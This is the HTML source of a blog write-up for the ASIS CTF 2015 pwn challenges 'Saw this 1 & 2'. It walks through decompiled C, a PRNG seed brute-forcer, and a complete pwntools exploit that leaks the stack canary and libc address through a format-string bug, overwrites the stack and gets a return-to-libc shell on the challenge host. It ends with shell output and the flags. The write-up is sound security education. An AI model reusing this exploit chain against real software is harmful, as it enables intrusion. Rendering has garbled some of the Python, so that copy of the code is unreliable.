@@ -1,0 +1,944 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>ASIS CTF 2015 Quals – Saw this (1 &amp; 2) - Hacking Tube 2.0</title>
+<meta name="description" content="Category: pwnPoints: 100 (Saw this-1), 400 (Saw this-2)">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="ASIS CTF 2015 Quals – Saw this (1 &amp; 2)">
+<meta property="og:url" content="http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/">
+
+
+  <meta property="og:description" content="Category: pwnPoints: 100 (Saw this-1), 400 (Saw this-2)">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2015-05-24T06:37:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="ASIS CTF 2015 Quals – Saw this (1 &amp; 2)">
+    <meta itemprop="description" content="Category: pwnPoints: 100 (Saw this-1), 400 (Saw this-2)">
+    <meta itemprop="datePublished" content="May 24, 2015">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">ASIS CTF 2015 Quals – Saw this (1 &amp; 2)
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> pwn
+<strong>Points:</strong> 100 (Saw this-1), 400 (Saw this-2)</p>
+
+<blockquote>
+  <p>Survive and get the flag!
+Note: This challenge contains two flags, one of them is easier to fetch, the other is harder. 
+The easier flag will be clearly indicated as “Flag 1”, the harder flag as “Flag 2”
+nc 87.107.123.3 31337</p>
+</blockquote>
+
+<!-- more -->
+
+<p>64 bit ELF. Lauch it with the almighty IDA Pro and press the powerful F5 key, we’ll find that the service first ask us to input our user name and a lucky number. Then, it will use <code class="highlighter-rouge">srand</code> to set up the random number seed, and generate a random number sequence.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">srand</span><span class="p">(</span><span class="n">seed</span> <span class="o">+</span> <span class="n">lucky_number</span><span class="p">);</span>
+ <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="n">format</span> <span class="o">=</span> <span class="s">"YOU LOST THE GAME! IT'S OVER!"</span><span class="p">;</span>
+ <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">floor</span><span class="p">(</span><span class="n">gen_rand_double</span><span class="p">()</span> <span class="o">*</span> <span class="mi">13</span><span class="p">.</span><span class="mi">0</span> <span class="o">+</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
+ <span class="n">printf</span><span class="p">(</span><span class="s">"I've thought of %d numbers. If you guess them correctly, you are free!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
+ 
+ <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">floor</span><span class="p">(</span><span class="n">gen_rand_double</span><span class="p">()</span> <span class="o">*</span> <span class="mi">256</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
+    
+ <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+ <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Number #%d: "</span><span class="p">,</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">v7</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_lucky_number</span><span class="p">();</span>
+    <span class="n">v5</span> <span class="o">=</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v10</span> <span class="o">&amp;&amp;</span> <span class="n">v5</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">v10</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="n">format</span> <span class="o">=</span> <span class="s">"YOU WON! You are free now!"</span><span class="p">;</span>
+    <span class="p">}</span>
+ <span class="p">}</span>
+ 
+ <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
+ <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+ <span class="n">print_freedom</span><span class="p">();</span> <span class="c1">// get flag1
+</span> <span class="k">do</span>
+ <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Do you want to play again (y/n)? "</span><span class="p">);</span>
+    <span class="n">read_input</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v12</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">==</span> <span class="sc">'y'</span> <span class="o">||</span> <span class="n">v12</span> <span class="o">==</span> <span class="sc">'Y'</span> <span class="p">)</span>
+      <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
+ <span class="p">}</span>
+ <span class="k">while</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">!=</span> <span class="sc">'n'</span> <span class="o">&amp;&amp;</span> <span class="n">v12</span> <span class="o">!=</span> <span class="sc">'N'</span> <span class="p">);</span>
+ <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>For <strong>Saw this-1</strong>, we’ll have to try to guess all the random numbers. By investigating the memory, we found that our <code class="highlighter-rouge">user_name</code> start from <code class="highlighter-rouge">0x603108</code>, and the <code class="highlighter-rouge">seed</code> variable’s at <code class="highlighter-rouge">0x603148</code>. Since it let us input at most 64 characters, we can leak the <code class="highlighter-rouge">seed</code> by input a <code class="highlighter-rouge">user_name</code> which length’s 64 characters long. After we leak the <code class="highlighter-rouge">seed</code>, we can enter a <code class="highlighter-rouge">lucky_number</code> which cause the line <code class="highlighter-rouge">srand(seed + lucky_number);</code> into <code class="highlighter-rouge">srand(0)</code>. This will cause the server always generate a same group of random numbers, and so we can easily beat the game and get the flag1.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I've thought of 10 numbers. If you guess them correctly, you are free!
+Number #1: 
+[+] sending: 44
+Number #2: 
+[+] sending: 79
+Number #3: 
+[+] sending: 136
+Number #4: 
+[+] sending: 242
+Number #5: 
+[+] sending: 43
+Number #6: 
+[+] sending: 179
+Number #7: 
+[+] sending: 57
+Number #8: 
+[+] sending: 126
+Number #9: 
+[+] sending: 31
+Number #10: 
+[+] sending: 21
+[*] Switching to interactive mode
+YOU WON! You are free now!      _   _  _____ _ _____   _   _ _____ _____   _____ _   _ _____ _   _ 
+     | | | ||  ___( )  ___| | \ | |  _  |_   _| |  ___| | | |  ___| \ | |
+     | |_| || |__ |/\ `--.  |  \| | | | | | |   | |__ | | | | |__ |  \| |
+     |  _  ||  __|   `--. \ | . ` | | | | | |   |  __|| | | |  __|| . ` |
+     | | | || |___  /\__/ / | |\  \ \_/ / | |   | |___\ \_/ / |___| |\  |
+     \_| |_/\____/  \____/  \_| \_/\___/  \_/   \____/ \___/\____/\_| \_/
+
+.........[ascii art picture]......   
+
+      _____ _   _   _____ _   _  _____  ______ _____ _____  _   _ _____ 
+     |_   _| \ | | |_   _| | | ||  ___| | ___ \_   _|  __ \| | | |_   _|
+       | | |  \| |   | | | |_| || |__   | |_/ / | | | |  \/| |_| | | |  
+       | | | . ` |   | | |  _  ||  __|  |    /  | | | | __ |  _  | | |  
+      _| |_| |\  |   | | | | | || |___  | |\ \ _| |_| |_\ \| | | | | |  
+      \___/\_| \_/   \_/ \_| |_/\____/  \_| \_|\___/ \____/\_| |_/ \_/  
+     
+                  _____   ___   _____ _____ _      _____ 
+                 /  __ \ / _ \ /  ___|_   _| |    |  ___|
+                 | /  \// /_\ \\ `--.  | | | |    | |__  
+                 | |    |  _  | `--. \ | | | |    |  __| 
+                 | \__/\| | | |/\__/ / | | | |____| |___ 
+                  \____/\_| |_/\____/  \_/ \_____/\____/ 
+
+
+
+               Good job Mario, but your princess isn't here! 
+
+                               Get a shell!
+
+
+Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
+</code></pre></div></div>
+
+<p>For <strong>Saw this-2</strong>, we’ll have to try to get a shell. The above pseudo code show us that there’s a <strong>format string vulnerability</strong> in the program. It seems that the <code class="highlighter-rouge">format</code> variable is hard-coded in the program, we can’t control it directly. But it’s on the stack, so if we can find a way to overwrite the <code class="highlighter-rouge">format</code> pointer, we’ll be able to trigger the format string vulnerability.</p>
+
+<p>It seems our only chance is to control the content of <code class="highlighter-rouge">v7[j]</code>. If <code class="highlighter-rouge">j</code> is big enough, we’ll be able to overwrite all the vairables on the stack, <strong>even the return address</strong>. We found that <code class="highlighter-rouge">v8</code> (the variable holds the iteration number) is exactly at <code class="highlighter-rouge">v7[16]</code>. So we’ll have to try to make <code class="highlighter-rouge">v8</code> &gt;= 17, which is, making the return value of <code class="highlighter-rouge">(signed int)floor(gen_rand_double() * 13.0 + 4.0)</code> = 17.</p>
+
+<p>For random numbers, the only variable we can control is <code class="highlighter-rouge">lucky_number</code>. We’ll have to find a proper number <code class="highlighter-rouge">N</code> = <code class="highlighter-rouge">seed</code> + <code class="highlighter-rouge">lucky_number</code>, and let <code class="highlighter-rouge">srand(N)</code> set the right random number seed so <code class="highlighter-rouge">(signed int)floor(gen_rand_double() * 13.0 + 4.0)</code> will be equal to 17. And so I wrote a C program to achieve the requirement:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;math.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">statebuf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+
+<span class="kt">double</span> <span class="nf">gen_rand_double</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kt">double</span><span class="p">)</span><span class="n">rand</span><span class="p">()</span><span class="o">/</span><span class="mi">2147483647</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">initstate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">statebuf</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">v8</span><span class="p">;</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">i</span><span class="o">&lt;=</span> <span class="mh">0xFFFFFFFF</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">srand</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+        <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">gen_rand_double</span><span class="p">()</span> <span class="o">*</span> <span class="mi">13</span><span class="p">.</span><span class="mi">0</span> <span class="o">+</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">v8</span> <span class="o">==</span> <span class="mi">17</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"found!!"</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"i: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">2147483647</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"done"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>The line <code class="highlighter-rouge">initstate(0, statebuf, 8)</code> is required to get the correct number, since the original binary has the exact same line of code in the initial process. Finally, we get <code class="highlighter-rouge">N</code> = <code class="highlighter-rouge">0x0dbdbb1e</code></p>
+
+<p>So now everytime we send a <code class="highlighter-rouge">lucky_number</code>, it has to be <code class="highlighter-rouge">0x0dbdbb1e</code> - <code class="highlighter-rouge">seed</code>. Since <code class="highlighter-rouge">v8</code> is set to 17 now, whenever we send the 17th number, <code class="highlighter-rouge">v8</code> will be modify to the number we send, which means we can control the iteration numbers, and so are the variables on the stack.</p>
+
+<p>Here are some important variables we’ll have to modify (overwrite):</p>
+<ol>
+  <li><code class="highlighter-rouge">v8</code>. The iteration number</li>
+  <li><code class="highlighter-rouge">v10</code>. Overwrite it to <strong>1</strong> so we won’t lose the game.</li>
+  <li><code class="highlighter-rouge">format</code>. Modify the pointer to the <code class="highlighter-rouge">user_name</code> buffer’s address (<code class="highlighter-rouge">0x603108</code>). Now we can trigger the format string vulnerability.</li>
+</ol>
+
+<p>Notice that other important variables (ex.<code class="highlighter-rouge">luck_number</code>) will have to remain the same value after you overwrite the stack. As for the format string payload, at first I try to use <strong>%n</strong> to write the memory, until I found that the service <strong>won’t let us input our user name for second time</strong>. Since we can’t reuse the vulnerability, I decided to leak the <strong>stack canary</strong> and the <strong>return address</strong> ( which returns to <code class="highlighter-rouge">__libc_start_main</code> ).</p>
+
+<p>Now we have the stack canary and the libc address. We can use the libc address to calculate the libc’s base address, and get the address of <code class="highlighter-rouge">system</code>, <code class="highlighter-rouge">pop rdi, ret</code> gadget and <code class="highlighter-rouge">/bin/sh</code> string pointer. After we have all the information, we can overwrite the stack canary and the return address to launch a return-2-libc attack.</p>
+
+<p>To sum up, here’s the exploitation of Saw this-2:</p>
+<ol>
+  <li>Brute-Force the <code class="highlighter-rouge">srand</code> seed so <code class="highlighter-rouge">v8</code>(the iteration number) can be set to <code class="highlighter-rouge">17</code>.</li>
+  <li>Overwrite <code class="highlighter-rouge">v7[16]</code> (=<code class="highlighter-rouge">v8</code>), so we can overwrite the variables on the stack.</li>
+  <li>Overwrite <code class="highlighter-rouge">format</code> to the <code class="highlighter-rouge">user_name</code> buffer so we can trigger the format string vulnerability.</li>
+  <li>Leak the stack canary &amp; return address.</li>
+  <li>Use the return adress to calculate libc’s base address, so we can get <code class="highlighter-rouge">system</code>, <code class="highlighter-rouge">pop rdi, ret</code> &amp; <code class="highlighter-rouge">/bin/sh</code>’s address.</li>
+  <li>Overwrite the stack canary &amp; return address to launch the return-2-libc attack.</li>
+</ol>
+
+<p>```python exp.py
+from pwn import *
+import time</p>
+
+<p>HOST = “87.107.123.3”
+PORT = 31337
+libc = ELF(“./libc.so.6”)</p>
+
+<p>guess = [124,34,77,-48,68,-36,70,-6,62,99,-86,66,17,58,77,11,53]</p>
+
+<p>r = remote(HOST, PORT)</p>
+
+<h1 id="name-buffer-address--0x603108">name buffer address = 0x603108</h1>
+<h1 id="21p--0xfd---0x1edb0--libc_base">%21$p -0xfd - 0x1edb0 = libc_base</h1>
+<h1 id="17p--canary">%17$p = canary</h1>
+
+<p>#send name
+print r.recvuntil(“call you? “)
+name = “%17$p.%21$p.”
+name = name.ljust(60, “A”)
+name = name.ljust(64, “B”)
+assert len(name) == 64
+r.send(name)</p>
+
+<h1 id="exploit-prng">exploit PRNG</h1>
+<p>s = r.recvuntil(“!\n”)
+print “s:”, s
+seed = u32(s[s.index(name)+64:s.index(“!”):].zfill(4))
+log.success(“seed: “+hex(seed))
+print r.recvuntil(“on it: “)
+lucky_number = 0x0dbdbb1e - seed
+lucky_hex = hex(lucky_number &amp; 0xffffffff)
+lucky_str = lucky_hex[lucky_hex.index(“0x”)+2::].zfill(8)</p>
+
+<p>assert len(lucky_str) == 8
+lucky_byte1 = str(int(lucky_str[6:8:], 16))
+lucky_byte2 = str(int(lucky_str[4:6:], 16))
+lucky_byte3 = str(int(lucky_str[2:4:], 16))
+lucky_byte4 = str(int(lucky_str[0:2:], 16))</p>
+
+<p>log.success(“sending luck_number: “+str(lucky_number))
+log.success(hex(seed)+” + “+hex(lucky_number)+” = “+hex(lucky_number+seed))
+r.send(str(lucky_number)+”\n”)</p>
+
+<h1 id="015-to-pass-the-first-16-numbers">0~15 to pass the first 16 numbers</h1>
+<p>for i in range(16):
+    print r.recvuntil(“: “)
+    log.success(“sending: “+str(guess[i]))
+    r.send(str(guess[i])+”\n”)</p>
+
+<p>payloads = [“44”,#17 byte, v8
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            lucky_byte1,   # lucky number
+            lucky_byte2,   # lucky number
+            lucky_byte3,   # lucky number
+            lucky_byte4,   # lucky number
+           “1”, # v10 for win
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           “17”, # i
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           “0”, # v12_1
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           “0”, # v12_2
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “8”, #name_buf 0x08
+            “49”, #name_buf 0x31
+            “96”, #name_buf 0x60
+            “0”, #name_buf 0x00
+           ]</p>
+
+<p>payloads[0] = str(len(payloads) + 16)</p>
+<h1 id="sending-payload">sending payload</h1>
+<p>for payload in payloads:
+    print r.recvuntil(“: “)
+    log.success(“sending: “+payload)
+    r.send(payload+”\n”)</p>
+
+<p>s = r.recvuntil(“BBBB”)
+canary = s.split(“.”)[0]
+canary = “0x” + canary[canary.index(“0x”)+2::].rjust(16, “0”)
+libc_base = int(s.split(“.”)[1], 16) - 0xfd - 0x1edb0
+log.success(“canary: “+canary)
+log.success(“libc_base: “+hex(libc_base))</p>
+
+<p>libc.address += libc_base
+pop_rdi_ret = libc_base + 0x2024b # pop rdi, ret
+bin_sh = libc_base + 0x14bc23     # pointer to /bin/sh
+system_addr = libc.symbols[‘system’]</p>
+
+<p>log.success(“pop_rdi_ret: “+hex(pop_rdi_ret))
+log.success(“/bin/sh: “+hex(bin_sh))
+log.success(“system: “+hex(system_addr))</p>
+
+<p>canary_byte = []
+for i in xrange(2, 17, 2):
+    canary_byte.append( str(int(canary[i:i+2:], 16) ) )</p>
+
+<p>r.send(“y\n”)</p>
+
+<h1 id="015-to-pass-the-first-16-numbers-1">0~15 to pass the first 16 numbers</h1>
+<p>for i in range(16):
+    print r.recvuntil(“: “)
+    log.success(“sending: “+str(guess[i]))
+    r.send(str(guess[i])+”\n”)</p>
+
+<p>payloads = [“52”,# will be adjust later
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            lucky_byte1,   # lucky number
+            lucky_byte2,   # lucky number
+            lucky_byte3,   # lucky number
+            lucky_byte4,   # lucky number
+           “1”, # v10 for win
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           “17”, # i
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           “0”, # v12_1
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           “0”, # v12_2
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “8”, #name_buf 0x08
+            “49”, #name_buf 0x31
+            “96”, #name_buf 0x60
+            “0”, #name_buf 0x00
+           “0”, # padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “168”, #name_buf 0xa8
+            “48”, #name_buf 0x30
+            “96”, #name_buf 0x60
+            “0”, #name_buf 0x00
+           “0”, # padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           canary_byte[7], # canary 1
+           canary_byte[6], # canary 2
+           canary_byte[5], # canary 3
+           canary_byte[4], # canary 4
+           canary_byte[3], # canary 5
+           canary_byte[2], # canary 6
+           canary_byte[1], # canary 7
+           canary_byte[0], # canary 8
+           “0”, # padding1
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           “0”, # padding2
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           “0”, # padding3
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+            “0”,#padding
+           str(pop_rdi_ret &amp; 0xff), # pop_rdi_ret
+            str( (pop_rdi_ret » 8 ) &amp; 0xff), # pop_rdi_ret
+            str( (pop_rdi_ret » 16 ) &amp; 0xff), # pop_rdi_ret
+            str( (pop_rdi_ret » 24 ) &amp; 0xff), # pop_rdi_ret
+            str( (pop_rdi_ret » 32 ) &amp; 0xff), # pop_rdi_ret
+            str( (pop_rdi_ret » 40 ) &amp; 0xff), # pop_rdi_ret
+            str( (pop_rdi_ret » 48 ) &amp; 0xff), # pop_rdi_ret
+            str( (pop_rdi_ret » 56 ) &amp; 0xff), # pop_rdi_ret
+           str(bin_sh &amp; 0xff), # bin_sh
+            str( (bin_sh » 8 ) &amp; 0xff), # bin_sh
+            str( (bin_sh » 16 ) &amp; 0xff), # bin_sh
+            str( (bin_sh » 24 ) &amp; 0xff), # bin_sh
+            str( (bin_sh » 32 ) &amp; 0xff), # bin_sh
+            str( (bin_sh » 40 ) &amp; 0xff), # bin_sh
+            str( (bin_sh » 48 ) &amp; 0xff), # bin_sh
+            str( (bin_sh » 56 ) &amp; 0xff), # bin_sh
+           str(system_addr &amp; 0xff), # system_addr
+            str( (system_addr » 8 ) &amp; 0xff), # system_addr
+            str( (system_addr » 16 ) &amp; 0xff), # system_addr
+            str( (system_addr » 24 ) &amp; 0xff), # system_addr
+            str( (system_addr » 32 ) &amp; 0xff), # system_addr
+            str( (system_addr » 40 ) &amp; 0xff), # system_addr
+            str( (system_addr » 48 ) &amp; 0xff), # system_addr
+            str( (system_addr » 56 ) &amp; 0xff), # system_addr
+           ]</p>
+
+<p>payloads[0] = str(len(payloads) + 16)</p>
+<h1 id="sending-payload-1">sending payload</h1>
+<p>for payload in payloads:
+    print r.recvuntil(“: “)
+    log.success(“sending: “+payload)
+    r.send(payload+”\n”)</p>
+
+<p>r.interactive()</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+And Finally, we get the flag2:
+
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           Good job Mario, but your princess isn't here! 
+
+                           Get a shell!
+</code></pre></div></div>
+
+<p>Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
+Do you want to play again (y/n)? $ n
+$ ls
+flag
+freedom
+sawthis
+wrapper.sh
+$ cat flag
+7h15_ch4ll3ng3_g4v3_m3_br41n_c4nc3r</p>
+
+<p>Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}</p>
+
+<p>```</p>
+
+<p>Brain cancer? LOL indeed, but it’s still a great challenge!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#asis" class="page__taxonomy-item" rel="tag">ASIS</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#c" class="page__taxonomy-item" rel="tag">C</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#format-string" class="page__taxonomy-item" rel="tag">format_string</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
